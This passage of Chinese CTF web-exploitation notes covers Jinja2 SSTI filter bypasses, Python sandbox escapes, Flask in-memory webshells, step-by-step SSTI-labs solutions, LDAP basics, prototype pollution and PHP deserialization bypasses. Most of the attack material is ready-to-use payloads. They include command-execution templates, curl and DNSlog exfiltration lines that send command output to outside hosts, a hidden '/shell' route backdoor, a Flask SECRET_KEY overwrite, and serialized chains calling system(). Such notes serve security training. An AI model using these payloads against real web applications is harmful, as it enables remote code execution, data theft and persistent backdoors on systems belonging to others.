  4.%c
    "%c"%95+"%c"%95+"%c%c%c%c%c%c%c"%(103,101,116,105,116,101,109)

  5.逆序
    eval(')"imaohw"(metsys.)"so"(__tropmi__'[::-1])

  6.base64
    'X19pbXBvcnRfXw=='.decode('base64')

  7.set 函数
    # 原理：dict简历字典，然后join将key合并
    {%set a=dict(__glo=a,bals__=a)|join%}
    {%set b=dict(o=a,s=a)|join%}
    {%set c=dict(po=a,pen=a)|join%}
    {%set cmd=dict(l=a,s=a)|join%}
    {%set d=dict(re=a,ad=a)|join%}
    {%set e=dict(__ge=a,titem__=a)|join%} 
    {{lipsum|attr(a)|attr(e)(b)|attr(c)(cmd)|attr(d)()}}

  8.chr 函数
     {% set chr=().__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.chr%}{{''.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.__import__(chr(111)%2Bchr(115)).popen(chr(119)%2Bchr(104)%2Bchr(111)%2Bchr(97)%2Bchr(109)%2Bchr(105)).read()}}

  # Pyjail 的 其他方法
    print('X19idWlsdGluc19f'.decode('base64')) # base64
    print("_builtins_".join("__"))
    print("%c%c%c%c"%(101,101,101,101)) #ascii
    print(chr(101),chr(22)) # ascii
    print(bytes([111,123,1233,232]))

    list(dict(whoami=1))[0] # list + dict
    ().__doc__.find('s') # __doc__
    ().__doc__[19]+().__doc__[86]+().__doc__[19] # 转字符串

-------------------------------------------------------------------------------------
# 绕数字
  # 0：int(bool([]))、Flase、len([])
  # 1：int(bool([""]))、True
  # 获取稍微大的数字：len(str({}.keys))，不过需要慢慢找长度符合的字符串
  # 1或0：float(True)

  # 构造数字：
  # 原理：建立字典，并用count对key统计长度
    {%set one=dict(a=a)|join|count%}
    {%set two=dict(aa=a)|join|count%}
    {%set three=dict(aaa=a)|join|count%}
    {% set eryisan=(two~one~three)|int %}

  # for循环
    {% for i in ''.__class__.__base__.__subclasses__() %}{% if i.__name__ == '_wrap_close' %}{{i.__init__.__globals__.popen('type flag').read()}}{% endif %}{% endfor %}
  
  # 以0绕过所有数字
    0 ** 0 == 1
    1 + 1 == 2
    2 + 1 == 3
    2 ** 2 == 4
    ...

-------------------------------------------------------------------------------------
# 绕长度
  exec(input())
  breakpoint() # 进入模式后直接进行输入命令即可
  help()命令进入help界面，在help界面中随便输入模块名字进入模块界面，输入!sh进入shell界面，!command执行命令

-------------------------------------------------------------------------------------
# 绕[]
dict['__builtins__']

  # 替换键值
  dict.__getitem__('__builtins__')
  dict.pop('__builtins__')
  dict.get('__builtins__')
  dict.setdefault('__builtins__')

  # 替换下标
  list[0]
  list.__getitem__(0)
  list.pop(0)

-------------------------------------------------------------------------------------
# 绕空格
  ()，[] 替换
  ()，[] 替换
  {{lipsum|string|list}}

-------------------------------------------------------------------------------------
# 绕运算符
  == 用 in 替换
  or 用 + - | 替换
  and 用 & * 替换
  绕()
  利用装饰器 @
  利用魔术方法，例如 enum.EnumMeta.__getitem__

-------------------------------------------------------------------------------------
# 绕''
  # requests绕过，外带请求绕过
  {{''.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.__import__(request.args.v1).popen(request.values.v2).read()}}&v1=os&v2=whoami

  # chr绕过
  {% set chr=().__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.chr%}{{''.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.__import__(chr(111)%2Bchr(115)).popen(chr(119)%2Bchr(104)%2Bchr(111)%2Bchr(97)%2Bchr(109)%2Bchr(105)).read()}}

-------------------------------------------------------------------------------------
# 绕. ,
  # 中括号绕过
  ''['__class__']['__mro__'][1]['__subclasses__']()[139]['__init__']['__globals__']['__builtins__']['eval']('__import__("os").popen("whoami").read()')

  (o := ().__class__.__mro__[1], g := o.__dict__["__getattribute__"], g(g(o, "__subclasses__")()[138].__init__.__builtins__["open"]("flag.txt"), "r\x65ad")())[-1]
  
  # |attr()绕过
  需要注意是键值还是方法
  比如 popen 转换成 |attr('__getitem__')('popen')
  而 .read 不是键值，虽然可以中括号绕过，但是原本不是键值，只需要 |attr('read')
  ()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(139)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("whoami").read()')

  # attr 变种（可以考虑和attr 相关的函数，都是获取属性，下面有一个精妙的手法，通过海象运算符赋值）
  (o := ().__class__.__mro__[1], g := o.__dict__["__getattribute__"], g(g(o, "__subclasses__")()[138].__init__.__builtins__["open"]("flag.txt"), "r\x65ad")())[-1]
  
-------------------------------------------------------------------------------------
# 绕 _
  # requests绕过
  {{''[request.args.v1][request.args.v2][1][request.args.v3]()[139][request.args.v4][request.args.v5][request.args.v6][request.args.v7](request.args.v8)}}&v1=__class__&v2=__mro__&v3=__subclasses__&v4=__init__&v5=__globals__&v6=__builtins__&v7=eval&v8=__import__("os").popen("whoami").read()

  # 关键字绕过也可以，因为都是字符串

  # {{lipsum|string|list}}

-------------------------------------------------------------------------------------
# 绕{{
  # {% if ... %}1{% endif %}
  {% if ''.__class__.__base__.__subclasses__()[139].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("curl http://xxx.xxx.xxx.xxx:12345/?i=`whoami`").read()') %}1{% endif %}

  # {%print(......)%}
  {% print(''.__class__.__base__.__subclasses__()[139].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls").read()')) %}
```

## SSTI python 内存马
```plain
url_for.__globals__['__builtins__']['eval']("app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())",{'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']})
```

分析：

```plain
url_for.__globals__['__builtins__']['eval'](
    "app.add_url_rule(
        '/shell', 
        'shell', 
        lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read()
    )",
    {
        '_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],
        'app':url_for.__globals__['current_app']
    }
)
```

基本原理为添加路由，进行命令执行

补充一个内存马

```plain
()}}{{url_for['__glob''als__']['__buil''tins__']['eval']("__import__('sys').modules['__main__'].__dict__['app'].before_request_funcs.setdefault(None,[]).append(lambda :__import__('os').popen('cat /flag').read())")
```

解析

```plain
url_for.__globals__.__builtins__['eval']("__import__('sys').modules['__main__'].__dict__['app'].before_request_funcs.setdefault(None,[]).append(lambda :__import__('os').popen('cat /flag').read())")
```

## SSTI labs 通关
```plain
PAYLOAD

# Leval 1 no waf
	{{''.__class__.__base__.__subclasses__()[139].__init__.__globals__.popen('type flag').read()}}

# level 2 bl['\{\{']
	{%print ''.__class__.__base__.__subclasses__()[139].__init__.__globals__.popen('type flag').read()%}

# level 3 no waf and blind
	# 输出
		{{''.__class__.__base__.__subclasses__()[139].__init__.__globals__.popen('type flag > 1.txt')}}
	# DNSlog外带
		{% for i in ''.__class__.__mro__[-1].__subclasses__() %}{% if i.__name__=='Popen' %}{{ i.__init__.__globals__['os'].popen('curl http://`cat flag`.0ppgif.ceye.io').read()}}{% endif %}{% endfor %}

# level 4 bl['[', ']']
	{{''.__class__.__base__.__subclasses__().__getitem__(139).__init__.__globals__.popen('type flag').read()}}

# level 5 bl['\'', '"']
	# 创建chr函数
    {%set chr=[].__class__.__mro__[-1].__subclasses__()[58].__init__.__globals__.__builtins__.chr%}
    {%print(().__class__.__mro__[-1].__subclasses__()[258].__init__.__globals__[chr(111)%2bchr(115)].popen(chr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)).read())%}

  # get请求外带
    {{lipsum.__globals__[request.args.arg1].popen(request.args.arg2).read()}}
    GET:arg1=popen,arg2=cat flag
    
	# post请求外带
    # popen
    {{().__class__.__base__.subclasses__()[132].__init__.__globals__[request.values.arg1](request.values.arg2).read()}}
    POST:arg1=popen,arg2=cat flag

  #	cookie请求外带
    # popen
    {{().__class__.__base__.subclasses__()[132].__init__.__globals__[request.cookies.arg1](request.cookies.arg2).read()}}
    Cookie:arg1=popen,arg2=cat flag

  # level 6 bl['_']
    %c 绕过，需要注意的是
    ''.__class__.
    ''["%c%c%c%c%c%c%c%c%c"%(95,95,99,108,97,115,115,95,95)]
    
    {{''["%c%c%c%c%c%c%c%c%c"%(95,95,99,108,97,115,115,95,95)]["%c%c%c%c%c%c%c%c"%(95,95,98,97,115,101,95,95)]["%c%c%c%c%c%c%c%c%c%c%c%c%c%c"%(95,95,115,117,98,99,108,97,115,115,101,115,95,95)]()[139]["%c%c%c%c%c%c%c%c"%(95,95,105,110,105,116,95,95)]["%c%c%c%c%c%c%c%c%c%c%c"%(95,95,103,108,111,98,97,108,115,95,95)].popen('type flag').read()}}

  # level 7 bl['.']
    中括号绕过
    {{''['__class__']['__base__']['__subclasses__']()[139]['__init__']['__globals__']['popen']('type flag')['read']()}}

  # level 8 bl["class", "arg", "form", "value", "data", "request", "init", "global", "open", "mro", "base", "attr"]
    中括号绕过
    {{''["%c%c%c%c%c%c%c%c%c"%(95,95,99,108,97,115,115,95,95)]["%c%c%c%c%c%c%c%c"%(95,95,98,97,115,101,95,95)]["%c%c%c%c%c%c%c%c%c%c%c%c%c%c"%(95,95,115,117,98,99,108,97,115,115,101,115,95,95)]()[139]["%c%c%c%c%c%c%c%c"%(95,95,105,110,105,116,95,95)]["%c%c%c%c%c%c%c%c%c%c%c"%(95,95,103,108,111,98,97,108,115,95,95)]['%c%c%c%c%c'%(112,111,112,101,110)]('type flag').read()}}
  
  ## level 9 bl['0-9']
      # 构造数字
      # for 循环
        {% for i in ''.__class__.__base__.__subclasses__() %}{% if i.__name__ == '_wrap_close' %}{{i.__init__.__globals__.popen('type flag').read()}}{% endif %}{% endfor %}
      
  ## level 10 set config = None

  # level 11 bl['\'', '"', '+', 'request', '.', '[', ']']
    {% set pop=dict(pop=a)|join %}
    {% set xiahuaxian=(lipsum|string|list)|attr(pop)(18)%}
    {% set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
    {% set getitem=(xiahuaxian,xiahuaxian,dict(getitem=a)|join,xiahuaxian,xiahuaxian)|join%}
    {% set space=(lipsum|string|list)|attr(pop)(9)%}
    {% set os=dict(os=a)|join%}
    {% set popen=dict(popen=a)|join%}
    {% set cat=dict(cat=a)|join%}
    {% set cmd=(cat,space,dict(flag=a)|join)|join%}
    {% set read=dict(read=a)|join%}

    {{lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()}}

    自己的payload
    code={% set pop=dict(pop=a)|join %}
    {% set space=(lipsum|string|list)|attr(pop)(9)%}
    {% set globals=dict(__globals__=a)|join %}
    {% set getitem=dict(__getitem__=a)|join %}
    {% set os=dict(os=a)|join %}
    {% set popen=dict(popen=a)|join %}
    {% set type=dict(type=a)|join %}
    {% set flag=dict(flag=a)|join %}
    {% set read=dict(read=a)|join %}
    {{ lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(type~space~flag)|attr(read)() }}

  # level 12 bl['_', '.', '0-9', '\\', '\'', '"', '[', ']']
    {%set nine=dict(aaaaaaaaa=a)|join|count%}
    {%set eighteen=nine+nine%}
    {% set pop=dict(pop=a)|join %}
    {% set xiahuaxian=(lipsum|string|list)|attr(pop)(e)%}
    {% set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
    {% set getitem=(xiahuaxian,xiahuaxian,dict(getitem=a)|join,xiahuaxian,xiahuaxian)|join%}
    {% set space=(lipsum|string|list)|attr(pop)(nine)%}
    {% set os=dict(os=a)|join%}
    {% set popen=dict(popen=a)|join%}
    {% set cat=dict(cat=a)|join%}
    {% set cmd=(cat,space,dict(flag=a)|join)|join%}
    {% set read=dict(read=a)|join%}

    {{lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()}}

    自己的 payload
    {% set pop=dict(pop=a)|join %}
    {% set nine=dict(aaaaaaaaa=a)|join|count %}
    {% set eighteen=nine+nine %}
    {% set space=(lipsum|string|list)|attr(pop)(nine)%}
    {% set xiahuaxian=(lipsum|string|list)|attr(pop)(eighteen) %}
    {% set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join %}
    {% set getitem=(xiahuaxian,xiahuaxian,dict(getitem=a)|join,xiahuaxian,xiahuaxian)|join %}
    {% set os=dict(os=a)|join %}
    {% set popen=dict(popen=a)|join %}
    {% set type=dict(type=a)|join %}
    {% set flag=dict(flag=a)|join %}
    {% set read=dict(read=a)|join %}
    {{ lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(type~space~flag)|attr(read)() }}}

# level 13 bl['_', '.', '\\', '\'', '"', 'request', '+', 'class', 'init', 'arg', 'config', 'app', 'self', '[', ']']
  {%set one=dict(a=a)|join|count%} 
  {%set eight=dict(aaaaaaaa=a)|join|count%}
  {%set nine=dict(aaaaaaaaa=a)|join|count%}
  {%set eighteen=(one~eight)|int%} 
  {% set pop=dict(pop=a)|join %} 
  {% set xiahuaxian=(lipsum|string|list)|attr(pop)(eighteen)%} 
  {% set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
  {% set getitem=(xiahuaxian,xiahuaxian,dict(getitem=a)|join,xiahuaxian,xiahuaxian)|join%}
  {% set space=(lipsum|string|list)|attr(pop)(nine)%} {% set os=dict(os=a)|join%} 
  {% set popen=dict(popen=a)|join%} {% set cat=dict(cat=a)|join%} 
  {% set cmd=(cat,space,dict(flag=a)|join)|join%} {% set read=dict(read=a)|join%}  

  {{lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()}}

  自己的payload
  {% set pop=dict(pop=a)|join %}
  {% set nine=dict(aaaaaaaaa=a)|join|count %}
  {% set two=dict(aa=a)|join|count %}
  {% set eighteen=nine*two %}
  {% set space=(lipsum|string|list)|attr(pop)(nine)%}
  {% set xiahuaxian=(lipsum|string|list)|attr(pop)(eighteen) %}
  {% set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join %}
  {% set getitem=(xiahuaxian,xiahuaxian,dict(getitem=a)|join,xiahuaxian,xiahuaxian)|join %}
  {% set os=dict(os=a)|join %}
  {% set popen=dict(popen=a)|join %}
  {% set type=dict(type=a)|join %}
  {% set flag=dict(flag=a)|join %}
  {% set read=dict(read=a)|join %}
  {{ lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(type~space~flag)|attr(read)() }}

```

# LDAP 注入
```plain
一些名词
DAP - Directory Access Protocol，即目录访问协议
LDAP - Lightweight Directory Access Protocol，轻量级目录访问协议
DIB - Directory Information Base，目录信息库
DIT - Directory Information Tree，目录信息树
DUA - Directory User Agent，用户代理
DN - Distinguished Name，可区别名称，即唯一名称
RDN - Relative Distinguished Name，相对唯一名称，指DIT内某个节点上的名称，上层节点的DN配合上本节点的RDN，能够构成本节点的DN

一些属性类型的介绍
c - country name，国家名
cn - common name，通用名称
dc - domain component，域名组件
o - organization name，机构名
ou - organization unit name，机构的单位名
sn - surname，姓
st - state or province name，州或省
```

LDAP 结构，LDAP 目录遵循类似于文件系统树的层次结构。此结构由表示唯一项（如用户、组或资源）的各种条目组成。看起来类似 AD 结构， AD 只是微软使用 LDAP 的实例，且提供了部分接口

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/35229002/1746958841022-edb4bdaa-c718-42e7-be25-54383edff537.png)

## ldap 服务器命令实操
```plain
ldapsearch -x -H ldap://192.168.31.242:389 -b dc=example,dc=org -D "cn=admin,dc=example,dc=org"
```

通常先用 -b 限制范围到域名组件中

pass

# 原型链污染
## Nodejs 原型链污染
```plain
var obj = {
   "name": "ErDogQAQ",
   "team": "ATL"
}

console.log(obj.name);
console.log(obj.team);
console.log(obj);

```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2024/jpeg/35229002/1723445853017-a002d4cd-0fb2-494c-badb-d803aca04d3b.jpeg)

发现多出了一个 **proto **键，指向这个类的原型，Object，那么，就可以通过修改这个键进行修改类的键值

例如：

```plain
let o1 = {}
let o2 = {a: 1, "__proto__": {b: 2}}
merge(o1, o2)
console.log(o1.a, o1.b)
o3 = {}
console.log(o3.b)
console.log(o2)
```

输出：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2024/jpeg/35229002/1723445967723-8713a586-30ac-4085-b1cf-fb0a64f0b0a0.jpeg)

## Python 原型链污染
merge 函数

```python
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
```

分析源代码，其实是将一个类的属性递归传递给另一个类中，与 nodejs 不同，python 的原型链污染是错误的传递了 base 键值造成了原型链污染

```python
class F:
    a="hehe"
class S_1(F):
    pass
class S_2(F):
    a="benben"

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
            #// 递归合并函数，将dst字典内的数据合并至sec内


instance = S_1()
instance2=S_2()
payload = {
    "__class__": {
        "__base__":
                {"a": "lalalala"}

    }
}
''' 全局污染 通过直接污染 init 初始化类的全局变量
payload = {
    "__init__":{
        "__globals__":{
            "BLACKLIST_IN_index":""}
        }
    }
'''
F2=F_2()
print(instance.__class__.__base__)
print(instance.a)
merge(payload,instance)
print(instance.a)
# 等效于 instance.__class__.__base__.a=lalalala
```

对上面的简单说明

```plain
.__class__ 返回一个空列表所属的类，即list 类。
.__base__ 和 __mro__ 返回list类的父类，其中包含父类的属性。

print(instance.__class__.__base__) 可以查看到 instance 的父类是 F
<class '__main__.F'>

merge 合并类的时候，由于 payload 中有 base 类，合并时，就污染了 instance 的 base 父类， a 的键值也一起合并进入了 instance

所以 merge(payload,instance); print(instance.a)
输出 lalala

同时需要说明的是，不能多级污染，无法污染到 F 的父类 object，只有 nodejs 可以
```

可污染的集中类型

1. flask 密钥替换

```python
{
    "__init__" : {
        "__globals__" : {
            "app" : {
                "config" : {
                    "SECRET_KEY" :"Polluted~"
                }
            }
        }
    }
}
```

2. _got_first_request 模拟第一次访问

```python
payload={
    "__init__":{
        "__globals__":{
            "app":{
                "_got_first_request":False
            }
        }
    }
}
```

3. _static_url_path 静态目录修改，设置静态目录，访问静态目录文件会当作静态文件下载

```python
payload={
    "__init__":{
        "__globals__":{
            "app":{
                "_static_folder":"./"
            }
        }
    }
}
```

4. app.jinja_loader.searchpath[0] 污染模板路径

```plain
app.jinja_loader.searchpath[0]=/
```

5. os.path.pardir 开启路径穿越

```python
payload={
    "__init__":{
        "__globals__":{
            "os":{
                "path":{
                    "pardir":"," # 默认值为 .. 当进行穿越是会 500 报错
                }
            }
        }
    }
}
```

# 反序列化
序列化与反序列化：将数据与字符串的互转，转变成方便存储的数据，类似pickle模型

| 数据类型 | 提示符 | 格式 |
| --- | --- | --- |
| 字符串 | s | s:长度:"内容" |
| 已转义字符串 | S | s:长度:"转义后的内容" |
| 整数 | i | i:数值 |
| 布尔值 | b | b:1 => true / b:0 => false |
| 空值 | N | N; |
| 数组 | a | a:大小:{键序列段;值序列段;<重复多次>} |
| 对象 | O | O:类型名长度:"类型名称":成员数:{成员名称序列段;成员值序列段:} |
| 引用 | R | R:反序列化变量的序号, 从1开始 |


## 反序列化 魔术方法
```plain
# __construct
  构造函数, 在对应对象实例化时自动被调用. 子类中的构造函数不会隐式调用父类的构造函数.
  在构造类时，可以自己编写 __construct 魔术方法，达到绕过效果

  在 PHP 8 以前, 与类名同名的方法可以作为 __constuct 调用但 __construct 方法优先

# __wakeup
  此方法在对象被反序列化时会调用

# __sleep
  此方法在对象被序列化时会调用

# __toString
  此方法在对象转化成字符串时会被调用.即对象名称
  1.  echo($obj)/print($obj)打印时会触发 
  2.  反序列化对象与字符串连接时 
  3.  反序列化对象参与格式化字符串时 
  4.  反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型） 
  5.  反序列化对象参与格式化SQL语句，绑定参数时 
  6.  反序列化对象在经过php字符串处理函数，如strlen()、strops()、strcmp()、addslashes()等 
  7.  在in_array()方法中，第一个参数时反序列化对象，第二个参数的数组中有__toString()返回的字符串的时候__toString()会被调用 
  8.  反序列化的对象作为class_exists()的参数的时候 
  
# __get
  在读取某些不可访问（比如私有属性）或者不存在的字段时会调用此方法, 传入参数为字段名称
  需要区分传参和读取的意思，比如 $this->c 虽然类里没有定义 public c，但是这是个传参值，而$this->c->d，没有d这个字段，无法传入

# __set
  给不可访问和不存在的字段赋值时会被调用, 传入的参数第一个为字段名, 第二个为赋值

# __invoke
  把对象中的做函数用时会使用, 例如 new foo() --> 这个对象当作函数执行 foo()

  当然不仅限于显式调用, 将其作为回调函数 (例如 array_map作为第一个参数传入) 也会调用此函数

# __call
  调用无法访问的方法时会调用

# __isset
  在对不可访问的字段调用 isset 或者 empty 时调用

# __unset
  对不可访问的字段使用 unset 时触发

# __debugInfo
  在使用 var_dump, print_r 时会被调用

# __invoke是对象被当做函数进行调用时就会触发，我们去找类似$a()这种的（所有类里面找）
```

## 反序列化 执行顺序
```plain
魔术方法执行顺序
对于魔术方法的调用顺序, 不同的情况下会有不同的顺序
首先, 一个对象在其生命周期中一定会走过 destruct, 只有当对象没有被任何变量指向时才会被回收
当使用 new 关键字来创建一个对象时会调用 construct

对于序列化/反序列化时的情况:
序列化时会先调用 sleep 再调用 destruct, 故而完整的调用顺序为: sleep -> (变量存在) -> destruct
反序列化时如果有 __wakeup 则会调用 __wakeUp 而不是 __construct, 故而逻辑为 __wakeUp/__construct -> (变量存在)

__construct() ->__sleep() -> __wakeup() -> __toString() -> __destruct()
<?php
class TestClass
{
    //一个变量
    public $variable = 'This is a string';
    //一个方法
    public function PrintVariable()
    {
        echo $this->variable.'<br />';
    }
    //构造函数
    public function  __construct()
    {
        echo '__construct<br />';
    }
    //析构函数
    public function __destruct()
    {
        echo '__destruct<br />';
    }
    //当对象被当作一个字符串
    public function __toString()
    {
        return '__toString<br />';
    }
}
//创建一个对象
//__construct会被调用
$object = new TestClass();
//创建一个方法
//‘This is a string’将会被输出
$object->PrintVariable();
//对象被当作一个字符串
//toString会被调用
echo $object;
//php脚本要结束时，__destruct会被调用
?>

```

## 反序列化 绕过
```plain
# 增加逃逸
<?php
class C
{
    public $s;
    public $str;

    public function __construct($s)
    {
        $this->s = $s;
    }
	
    public function __destruct()
    {
        echo $this ->str;
    }
}
// 单独设置两个变量 s=A str=B 输出 O:1:"C":2:{s:1:"s";s:1:"A";s:3:"str";s:1:"B";}
// 直接进行 new C("A") 输出        O:1:"C":2:{s:1:"s";s:1:"A";s:3:"str";N;}
// 伪造 A 输出                     O:1:"C":2:{s:1:"s";s:24:"A";s:3:"str";s:1:"B";}";s:3:"str";N;}，此时已经构造好了，但是A长度错误无法触发
// 但是 str_ireplace("\0","00",$ser); 现在每次替换都多一个 0 "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\";s:3:\"str\";s:1:\"B\";} 现在每次多的刚好可以补齐payload 生成和实际反序列化长度的差异

$ser =serialize(new C("\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\";s:3:\"str\";s:1:\"B\";}"));
$data = str_ireplace("\0","00",$ser);
$out = unserialize($data);
print_r($out);
?>

# 缩减逃逸同理
每次替换减少，字符串够长就能提前闭合，这时候加个引号就能让里面识别为字符串，外面为 绕过内容

# __wakeup绕过
  1.属性个数不匹配，执行时会被跳过
    例如
      O:4:"Dino":1:{s:4:"addr";s:3:"209";}
    改成
      O:4:"Dino":114514:{s:4:"addr";s:3:"209";}
      
  2.变量引用（两个变量同时只想一个内存地址
    $this->b=$this->c 同时都是指向一个内存地址
    
  3.C绕过
    O标识符代表Object对象类型，C表示达标类名类型，修改C表示符，则会解释为一个新类，而不是被反序列化的类，达到绕过效果
    例题：
      <?php
        class ctfshow{

        public function __wakeup(){
        die("not allowed!");
      }

      public function __destruct(){
          system($this->ctfshow);
      }
    } 
    $a=new ctfshow();
    echo serialize($a);
    //O:7:"ctfshow":0:{}

    payload：
     <?php
      class ctfshow{
    	public $ctfshow="cat /f*";
    }
    $A=new ArrayObject;
    $A->a=new ctfshow;
    echo serialize($A);
    ?>

  4.GC回收机制
    //正常payload：
    a:2:{i:0;O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:6:"system";s:3:"var";s:7:"cat /f*";}}}}}i:1;N;}

    //删除末尾花括号payload：
    a:2:{i:0;O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:6:"system";s:3:"var";s:7:"cat /f*";}}}}}i:1;N;

    //数组对象占用指针payload（加粗部分数组下标和前面重复都是0，导致指针出问题）
    a:2:{i:0;O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:6:"system";s:3:"var";s:7:"cat /f*";}}}}}i:0;N;}

    //正常payload
    O:1:“A”:2:{s:4:“info”;O:1:“B”:1:{s:3:“end”;N;}s:4:“Aend”;s:1:“1”;}
    
    //外部类属性值长度异常payload：
    //先外类__destruct()后内类__wakeup()
    O:1:“A”:2:{s:4:“info”;O:1:“B”:1:{s:3:“end”;N;}s:4:“Aend”;s:2:“1”;}
    O:1:“A”:2:{s:4:“info”;O:1:“B”:1:{s:3:“end”;N;}s:4:“Aend”;s:1:“12”;}

# 16进制绕过字符串检测，需要注意的是，要把S改为大写才能解析16进制
  例如
    'O:4:"Read":1:{s:4:"name";S:4:"flag";}'
  改成
    'O:4:"Read":1:{s:4:"name";S:4:"\66\6c\61\67";}'

# 妙用引用
  class A {
      public $a;
      public $b;    
  }

payload:
  $a = new A();
  $a->a = &$a->b;
  echo serialize($a);
  序列化后：O:1:"A":2:{s:1:"a";N;s:1:"b";R:2;}
```

## 反序列化 GC回收机制（提前触发 __desturct ）
为什么要触发 __desturct ，因为正常情况下，报错就无法再触发 __desturct ，运用 GC 回收机制可以进行提前触发

GC 回收机制简称垃圾回收机制，使用 引用计数 和 回收周期 管理内存对象，当一个指针为 NULL 时，会被 GC 回收机制当作垃圾回收掉，自动触发 __desturct 方法

推荐文章 [浅析PHP GC垃圾回收机制及常见利用方式 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/11843?time__1311=Cq0xuD0DnD203GNem%3DDRiDgQDc7D9AG07roD)

```php
<?php
  $a = "new string"; 
xdebug_debug_zval('a'); //用于查看变量a的zval变量容器的内容
?>

// refcount = 1	指向zval变量容器的变量个数
// is_ref = 0		它用来标识这个变量是否是属于引用集合
```

```php
<?php
  <?php
  $a="new string"; 
$b =&$a;
xdebug_debug_zval('a');
?>

// refcount = 2	变量个数为2，因为 b 引用时候进行了复制
// is_ref = 1		被 b 引用
```

```php
<?php
$a="new string"; 
$b =&$a;
$c =&$b;
xdebug_debug_zval('a');

// refcount = 3
// is_ref = 1

unset($b,$c);
xdebug_debug_zval('a');

// refcount = 1 unset了
// is_ref = 0

?>
```

实战 demo

```php
<?php
  highlight_file(__FILE__); 
error_reporting(0); 
class test{ 
  public $num; 
  public function __construct($num) {
    $this->num = $num; echo $this->num."__construct"."</br>"; 
  }
  public function __destruct(){
    echo $this->num."__destruct()"."</br>"; 
  }
}
$a = new test(1); 
unset($a);
$b = new test(2); 
$c = new test(3);
```

<!-- 这是一张图片，ocr 内容为：<?PHP FILE HIGHLIGHT_FILE ERROR_REPORTING(0); CLASS TEST{ $RUM PUBLIC _CONSTRUCT ($NUM) FUNCTION PUBLIC ."</BR>"; $THIS->NUM." $NUM: $THIS->NUM ECHO CONSTRUC DESTRUCT()[ FUNCTION PUBLIC _DESTRUCT()"."</BR>"; $THIS->NUM. ECHO I TEST(1); E$ NEW UNSET(SA); $B TEST(2); MEW 提前触发 TEST(3): $C NEW CONSTRUCT DESTRUCT() CONSTRUCT CONSTRUCT 3 DESTRUCTO 2 DESTRUCT() 人先知社区 -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1728976156661-93a43120-3929-4386-8471-3f9c36aaf212.png)

还有第二种方法，通过数组，将索引对象，复制为 0 ，就当失去了引用

```php
<?php
  show_source(__FILE__);

class B {
  function __destruct() {
    global $flag;
    echo $flag;
  }
}
$a=array(new B,0);

echo serialize($a);
```

```plain
a:2:{i:0;O:1:"B":0:{}i:1;i:0;}
对象类型:长度:{类型:长度;类型:长度:类名:值类型:长度;类型:长度;}
数组:长度为2::{int型:长度0;类:长度为1:类名为"B":值为0 int型:值为1：int型;值为0
```

## 反序列化 phar反序列化
需要注意的是，phar反序列化并不可以作为一个类进行反序列化，

且 触发方式是php中的函数，而不是通过链子触发

影响范围

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1719920185060-ebcf308e-098c-4946-96d3-fb8ffc9fdb75.png)

```plain
生成文件
// 生成后使用 phar://协议访问
<?php
    class TestObject {
    }

